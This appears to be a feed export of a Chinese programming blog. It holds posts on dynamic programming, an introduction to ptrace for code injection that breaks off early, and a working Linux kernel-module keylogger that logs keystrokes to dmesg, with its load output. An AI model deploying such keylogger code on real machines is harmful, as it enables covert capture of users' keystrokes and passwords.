<p>实例：<br>斐波那契数列问题<br>基本算法：<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">function <span class="function"><span class="title">fib</span><span class="params">(n)</span></span></span><br><span class="line">    <span class="keyword">if</span> n = <span class="number">0</span> or n = <span class="number">1</span></span><br><span class="line">        return <span class="number">1</span></span><br><span class="line">    return <span class="function"><span class="title">fib</span><span class="params">(n-<span class="number">1</span>)</span></span> + <span class="function"><span class="title">fib</span><span class="params">(n-<span class="number">2</span>)</span></span></span><br></pre></td></tr></table></figure></p>
<p>上述的迭代过程很显然有很多重复计算的子问题，这样使程序不够高效。<br>改进方法：我们可以通过保存已经算出的子问题的解，来避免重复计算，当然这会耗费掉一些内存空间。【空间换取时间】<br><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">array map[<span class="operator">0...<span class="keyword">n</span>] = &#123;<span class="number">0</span>=&gt;<span class="number">0</span>,<span class="number">1</span>=&gt;<span class="number">1</span>&#125;</span><br><span class="line">fib(<span class="keyword">n</span>)</span><br><span class="line">    <span class="keyword">if</span>(<span class="keyword">map</span> <span class="keyword">m</span> dose <span class="keyword">not</span> contain <span class="keyword">key</span> <span class="keyword">n</span>)</span><br><span class="line">        <span class="keyword">m</span>[<span class="keyword">n</span>] := fib(<span class="keyword">n</span>-<span class="number">1</span>) + fib(<span class="keyword">n</span>-<span class="number">2</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">m</span>[<span class="keyword">n</span>]</span></span><br></pre></td></tr></table></figure></p>
<p>使用动态规划的常用算法：</p>
<ul>
<li>最长单调子序列</li>
<li>最长公共子序列 LCS</li>
<li>Floyd-Warshall算法 最短路径问题</li>
<li>Viterbi算法</li>
</ul>
<h2 id="LCS问题：">LCS问题：</h2><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br></pre></td><td class="code"><pre><span class="line">/<span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span></span><br><span class="line"> 文件名        ：lcs.cpp</span><br><span class="line"> 创建者        ：Monkee</span><br><span class="line"> 创建时间      ：2015/8/30 10:34:35</span><br><span class="line"> 功能描述      ：动态规划解决LCS问题</span><br><span class="line">              </span><br><span class="line"> <span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span><span class="keyword">*</span>/</span><br><span class="line"></span><br><span class="line"><span class="comment">#include &lt;iostream&gt;</span></span><br><span class="line"><span class="comment">#include &lt;vector&gt;</span></span><br><span class="line"><span class="comment">#include &lt;string&gt;</span></span><br><span class="line"></span><br><span class="line">using namespace std;</span><br><span class="line"></span><br><span class="line">int max(int a,int b)</span><br><span class="line">&#123;</span><br><span class="line">	return (a&gt;b) ? a : b;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">//最长公共子序列(不要求连续)</span><br><span class="line">//使用一个二维表来存储状态</span><br><span class="line">int LCS1(string x,string y,int m,int n)</span><br><span class="line">&#123;</span><br><span class="line">	vector<span class="variable">&lt;vector&lt;int&gt;</span> &gt; matrix(m+1,vector<span class="variable">&lt;int&gt;</span>(n+1));</span><br><span class="line">	</span><br><span class="line">	for (int i=0;i<span class="variable">&lt;m+1;i++)</span><br><span class="line">	&#123;</span><br><span class="line">		for(int j=0;j&lt;n+1;j++)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i == 0 || j ==0)</span><br><span class="line">			&#123;</span><br><span class="line">				matrix[i][j] = 0;</span><br><span class="line">			&#125; else if(x[i-1] == y[j-1])&#123;</span><br><span class="line">				matrix[i][j] = matrix[i-1][j-1] + 1;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				matrix[i][j] = max(matrix[i-1][j],matrix[i][j-1]);</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return matrix[m][n];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//最长公共子串</span><br><span class="line">//使用一个一维表来存储状态</span><br><span class="line">int LCS2(string x,string y,int m,int n)</span><br><span class="line">&#123;</span><br><span class="line">	vector&lt;int&gt;</span> array(n);</span><br><span class="line">	int maxl = 0;</span><br><span class="line"></span><br><span class="line">	for (int j=0;j<span class="variable">&lt;m;j++)</span><br><span class="line">	&#123;</span><br><span class="line">		for (int i=n-1;i&gt;</span>=0;i--)</span><br><span class="line">		&#123;</span><br><span class="line">			if (i==0 ||<span class="string"> j==0)</span><br><span class="line">			&#123;</span><br><span class="line">				if (x[j] == y[i])</span><br><span class="line">				&#123;</span><br><span class="line">					array[i] = 1;</span><br><span class="line">				&#125; else &#123;</span><br><span class="line">					array[i] = 0;</span><br><span class="line">				&#125;</span><br><span class="line">			&#125; else if (x[j] == y[i])</span><br><span class="line">			&#123;</span><br><span class="line">				array[i] = array[i-1] + 1;</span><br><span class="line">			&#125; else &#123;</span><br><span class="line">				array[i] = 0;</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			if (array[i] &gt; maxl)</span><br><span class="line">			&#123;</span><br><span class="line">				maxl = array[i];</span><br><span class="line">			&#125;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	return maxl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	string x = "ABCDEFGH";</span><br><span class="line">	string y = "ABCdfeghEFGH";</span><br><span class="line"></span><br><span class="line">	cout&lt;&lt;"最长公共子序列："&lt;&lt;LCS1(x,y,x.length(),y.length())&lt;&lt;endl;</span><br><span class="line">	cout&lt;&lt;"最长公共子串："&lt;&lt;LCS2(x,y,x.length(),y.length())&lt;&lt;endl;</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span></span><br></pre></td></tr></table></figure>
<h2 id="最短路径问题_Floyd-Warshall算法">最短路径问题 Floyd-Warshall算法</h2><p>Floyd-Warshall算法，简称Floyd算法，用于求解任意两点间的最短距离，即多源最短路径问题，时间复杂度为O(n^3)，空间复杂度为O(n^2)。</p>
<p>算法代码实现如下：<br><figure class="highlight inform7"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">void Floyd()&#123;</span><br><span class="line">    int i,j,k;</span><br><span class="line">    for(k=1;k&lt;=n;k++)</span><br><span class="line">        for(i=1;i&lt;=n;i++)</span><br><span class="line">            for(j=1;j&lt;=n;j++)</span><br><span class="line">                if(dist<span class="comment">[i]</span><span class="comment">[k]</span>+dist<span class="comment">[k]</span><span class="comment">[j]</span>&lt;dist<span class="comment">[i]</span><span class="comment">[j]</span>)</span><br><span class="line">                    dist<span class="comment">[i]</span><span class="comment">[j]</span>=dist<span class="comment">[i]</span><span class="comment">[k]</span>+dist<span class="comment">[k]</span><span class="comment">[j]</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
<h2 id="参考：">参考：</h2><ul>
<li><a href="http://songlee24.github.io/2014/11/29/print-all-LCS/" target="_blank" rel="external">输出最长公共子序列</a></li>
<li><a href="http://blog.csdn.net/v_JULY_v/article/details/6110269" target="_blank" rel="external">动态规划算法解LCS问题</a></li>
<li><a href="http://wiki.jikexueyuan.com/project/easy-learn-algorithm/floyd.html" target="_blank" rel="external">只有五行的 Floyd 最短路算法</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<h2 id="动态规划_(Dynamic_Programming)">动态规划 (Dynamic Programming)</h2><p>适用于<strong>重叠子问题</strong>和<strong>最优子结构</strong>性质的问题。</p>
<p>大致思路:<br]]>
    </summary>
    
      <category term="dynamic_programming" scheme="http://m0nkee.github.io/tags/dynamic-programming/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[smaller-keylogger]]></title>
    <link href="http://m0nkee.github.io/2015/08/25/smaller-keylogger/"/>
    <id>http://m0nkee.github.io/2015/08/25/smaller-keylogger/</id>
    <published>2015-08-25T08:02:35.000Z</published>
    <updated>2015-08-25T08:12:50.942Z</updated>
    <content type="html"><![CDATA[<p>内核存在这种能够hook keyboard event的内核模块接口。<br>使用notifier_block向notification队列注册方法。<br>该接口在linux内核驱动中，盲人设备的驱动就使用了该接口，具体可参考文件<br><code>linux/drivers/accessibility/braille/braille_console.c</code>。</p>
<p>这里只是给出了个使用实例，以供参考：<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/module.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/kernel.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;linux/keyboard.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">MODULE_LICENSE(<span class="string">"Dual BSD/GPL"</span>);</span><br><span class="line">MODULE_AUTHOR(<span class="string">"Monkee"</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">key_notify</span><span class="params">(<span class="keyword">struct</span> notifier_block *nblock, <span class="keyword">unsigned</span> <span class="keyword">long</span> code, <span class="keyword">void</span> *__param)</span></span>&#123;</span><br><span class="line">	<span class="keyword">struct</span> keyboard_notifier_param *param = __param;</span><br><span class="line">	<span class="keyword">struct</span> vc_data *vc = param-&gt;vc;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">int</span> ret = NOTIFY_OK;</span><br><span class="line">	<span class="keyword">if</span>(code == KBD_KEYCODE)&#123;</span><br><span class="line">		printk(KERN_DEBUG <span class="string">"KEYLOGGER %i %s\n"</span>,param-&gt;value,(param-&gt;down ? <span class="string">"down"</span> : <span class="string">"up"</span>));</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">static</span> <span class="keyword">struct</span> notifier_block nb = &#123;</span><br><span class="line">	.notifier_call = key_notify</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">keyboard_init</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	register_keyboard_notifier(&amp;nb);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">keyboard_exit</span><span class="params">(<span class="keyword">void</span>)</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	unregister_keyboard_notifier(&amp;nb);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">module_init(keyboard_init);</span><br><span class="line">module_exit(keyboard_exit);</span><br></pre></td></tr></table></figure></p>
<p>加载驱动<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor"># insmod keyboard.ko</span></span><br><span class="line"><span class="preprocessor"># dmesg | tail -<span class="number">20</span></span></span><br><span class="line">[<span class="number">216201.550997</span>] KEYLOGGER <span class="number">103</span> up</span><br><span class="line">[<span class="number">216206.363063</span>] KEYLOGGER <span class="number">105</span> down</span><br><span class="line">[<span class="number">216206.437957</span>] KEYLOGGER <span class="number">105</span> up</span><br><span class="line">[<span class="number">216206.538061</span>] KEYLOGGER <span class="number">105</span> down</span><br><span class="line">[<span class="number">216206.607156</span>] KEYLOGGER <span class="number">105</span> up</span><br><span class="line">[<span class="number">216211.548919</span>] KEYLOGGER <span class="number">12</span> down</span><br><span class="line">[<span class="number">216211.619961</span>] KEYLOGGER <span class="number">12</span> up</span><br><span class="line">[<span class="number">216213.065969</span>] KEYLOGGER <span class="number">28</span> down</span><br><span class="line">[<span class="number">216213.137859</span>] KEYLOGGER <span class="number">28</span> up</span><br><span class="line">[<span class="number">216218.750149</span>] KEYLOGGER <span class="number">103</span> down</span><br><span class="line">[<span class="number">216218.822130</span>] KEYLOGGER <span class="number">103</span> up</span><br><span class="line">[<span class="number">216219.951923</span>] KEYLOGGER <span class="number">105</span> down</span><br><span class="line">[<span class="number">216220.019726</span>] KEYLOGGER <span class="number">105</span> up</span><br><span class="line">[<span class="number">216220.716426</span>] KEYLOGGER <span class="number">105</span> down</span><br><span class="line">[<span class="number">216220.782454</span>] KEYLOGGER <span class="number">105</span> up</span><br><span class="line">[<span class="number">216222.020744</span>] KEYLOGGER <span class="number">3</span> down</span><br><span class="line">[<span class="number">216222.167673</span>] KEYLOGGER <span class="number">3</span> up</span><br><span class="line">[<span class="number">216223.508625</span>] KEYLOGGER <span class="number">111</span> down</span><br><span class="line">[<span class="number">216223.613600</span>] KEYLOGGER <span class="number">111</span> up</span><br><span class="line">[<span class="number">216224.179975</span>] KEYLOGGER <span class="number">28</span> down</span><br><span class="line"><span class="preprocessor"># rmmod keyboard</span></span><br></pre></td></tr></table></figure></p>
<p>关于上述键值表示的含义定义在文件<code>linux/input.h</code>中，博主懒，上述代码就没对其进行处理了…<br><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="hexcolor">#def</span>ine KEY_RESERVED		<span class="number">0</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_ESC			<span class="number">1</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_1			<span class="number">2</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_2			<span class="number">3</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_3			<span class="number">4</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_4			<span class="number">5</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_5			<span class="number">6</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_6			<span class="number">7</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_7			<span class="number">8</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_8			<span class="number">9</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_9			<span class="number">10</span></span><br><span class="line"><span class="hexcolor">#def</span>ine KEY_0			<span class="number">11</span></span><br><span class="line">...</span><br></pre></td></tr></table></figure></p>
<p>参考：</p>
<ul>
<li><a href="http://www.gadgetweb.de/programming/39-how-to-building-your-own-kernel-space-keylogger.html" target="_blank" rel="external">how to building your own kernel space keyloger</a></li>
<li><a href="http://beneathclevel.blogspot.co.uk/2013/06/a-linux-rootkit-tutorial-introduction.html" target="_blank" rel="external">A Linux rootkit tutorial - an introduction</a></li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>内核存在这种能够hook keyboard event的内核模块接口。<br>使用notifier_block向notification队列注册方法。<br>该接口在linux内核驱动中，盲人设备的驱动就使用了该接口，具体可参考文件<br><code>linux/drive]]>
    </summary>
    
      <category term="Hacking_Linux" scheme="http://m0nkee.github.io/tags/Hacking-Linux/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ptrace实现代码注入]]></title>
    <link href="http://m0nkee.github.io/2015/08/20/play-ptrace/"/>
    <id>http://m0nkee.github.io/2015/08/20/play-ptrace/</id>
    <published>2015-08-20T03:22:08.000Z</published>
    <updated>2015-08-20T03:27:17.612Z</updated>
    <content type="html"><![CDATA[<h2 id="patrace简介">patrace简介</h2><p>使用过Linux系统多多少少会接触方便我们查看执行的程序的系统调用的strace命令或者编程时使用gdb进行程序调试。他们幕后原理工作其实就是ptrace完成的。</p>
<p>我们通过<code>man ptrace</code>命令可以查看ptrace的使用说明。<br>ptrace系统调从名字上看是用于进程跟踪的，它提供了父进程可以观察和控制其子进程执行的能力，并允许父进程检查和替换子进程的内核镜像(包括寄存器)的值。其基本原理是: 当使用了ptrace跟踪后，所有发送给被跟踪的子进程的信号(除了SIGKILL)，都会被转发给父进程，而子进程则会被阻塞，这时子进程的状态就会被系统标注为TASK_TRACED。而父进程收到信号后，就可以对停止下来的子进程进行检查和修改，然后让子进程继续运行。</p>
<p>ptrace函数的定义</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">long</span> <span class="title">ptrace</span><span class="params">(<span class="keyword">int</span> request, <span class="keyword">int</span> pid, <span class="keyword">int</span> addr, <span class="keyword">int</span> data)</span></span>;</span><br></pre></td></tr></table></figure>
<p>函数描述：<br>request参数决定了系统调用的功能：</p>
<blockquote>
<p>PTRACE_TRACEME<br>本进程被其父进程所跟踪。其父进程应该希望跟踪子进程。</p>
<p>PTRACE_PEEKTEXT, PTRACE_PEEKDATA<br>从内存地址中读取一个字节，内存地址由addr给出。</p>
<p>PTRACE_PEEKUSR<br>从USER区域中读取一个字节，偏移量为addr。</p>
<p>PTRACE_POKETEXT, PTRACE_POKEDATA<br>往内存地址中写入一个字节。内存地址由addr给出。</p>
<p>PTRACE_POKEUSR<br>往USER区域中写入一个字节。偏移量为addr。</p>
<p>PTRACE_SYSCALL, PTRACE_CONT<br>重新运行。</p>
<p>PTRACE_KILL<br>杀掉子进程，使它退出。</p>
<p>PTRACE_SINGLESTEP<br>设置单步执行标志</p>
<p>PTRACE_ATTACH<br>跟踪指定pid 进程。</p>
<p>PTRACE_DETACH<br>结束跟踪</p>
</blockquote>
<p>Intel386特有：</p>
<blockquote>
<p>PTRACE_GETREGS<br>读取寄存器</p>
<p>PTRACE_SETREGS<br>设置寄存器</p>
<p>　PTRACE_GETFPREGS<br>读取浮点寄存器</p>
<p>　PTRACE_SETFPREGS<br>设置浮点寄存器</p>
</blockquote>
<p>返回值</p>
<blockquote>
<p>成功返回0，出错返回-1；</p>
</blockquote>
<p>注意：init进程不可以使用此函数</p>
<p>ptrace通过如下调用进入内核的<br><figure class="highlight objectivec"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 在linux/kernel/ptrace.c文件中</span></span><br><span class="line">SYS<span class="built_in">CALL_DEFINE4</span>(ptrace, <span class="keyword">long</span>, request, <span class="keyword">long</span>, pid, <span class="keyword">long</span>, addr, <span class="keyword">long</span>, data)</span><br></pre></td></tr></table></figure></p>
<h2 id="小试牛刀–简单的PTRACE_ME">小试牛刀–简单的PTRACE_ME</h2><p>这里首先使用PTRACE_ME实现父进程跟踪子进程</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/ptrace.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;sys/wait.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="preprocessor">#<span class="keyword">include</span> <span class="string">&lt;asm/ptrace-abi.h&gt;</span> /*ORIG_EAX*/</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span><br><span class="line"></span>&#123;</span><br><span class="line">	<span class="keyword">pid_t</span> child;</span><br><span class="line">	<span class="keyword">long</span> orig_eax;</span><br><span class="line"></span><br><span class="line">	child = fork(); <span class="comment">/*创建子进程*/</span></span><br><span class="line">	<span class="keyword">if</span>(child == <span class="number">0</span>)&#123; </span><br><span class="line">		ptrace(PTRACE_TRACEME, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);<span class="comment">/*通知内核trace me*/</span></span><br><span class="line">		execl(<span class="string">"/bin/ls"</span>,<span class="string">"ls"</span>,<span class="literal">NULL</span>);</span><br><span class="line">	&#125;	<span class="keyword">else</span> &#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>); <span class="comment">/*等待子进程的通知*/</span></span><br><span class="line">		<span class="comment">/*获取子进程的控制权后，就开始查看子进程的寄存器等值*/</span></span><br><span class="line">		orig_eax = ptrace(PTRACE_PEEKUSER, child, <span class="number">4</span>*ORIG_EAX, <span class="literal">NULL</span>);</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">"The child made a system call %d\n"</span>,orig_eax);</span><br><span class="line">		<span class="comment">/*查完信息后，将控制权还给子进程，让其接着运行*/</span></span><br><span class="line">		ptrace(PTRACE_CONT, child, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>运行结果:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">~/code/ptrace<span class="preprocessor"># ./ptrace1 </span></span><br><span class="line">The child mad a system call <span class="number">11</span></span><br><span class="line">~/code/ptrace<span class="preprocessor"># ptrace1  ptrace1.c  <span class="comment">//此是ls执行结果</span></span></span><br></pre></td></tr></table></figure></p>
<p>上述程序首先通过fork创建了一个子进程，子进程中通过PTRACE_TRACEME来告诉内核，让其他程序来跟踪我，然后通过execl函数执行ls命令；父进程中通过wait等待来自内核的通知，收到通知后立即接管子进程，然后查看其eax的值即系统调用号，完成对子进程的操作后，通过PTRACE_CON将控制权还给子进程，子进程接着执行ls命令。</p>
<p>从上面的结果可知子进程在执行ls命令时，执行了11号系统调用。通过查看/usr/include/asm/unistd.h文件可知11是函数execve的系统调用号。</p>
<p>在出现系统调用后，内核会将eax(存放系统调用号)保存起来，所有通过使用PTRACE_PEEKUSER可以读取出这个值。</p>
<h2 id="ptrace实现进程中断">ptrace实现进程中断</h2><p>我们知道gdb在调试程序的时候可以让其停留在端点处。下面我通过ptrace来实现其基本原理。</p>
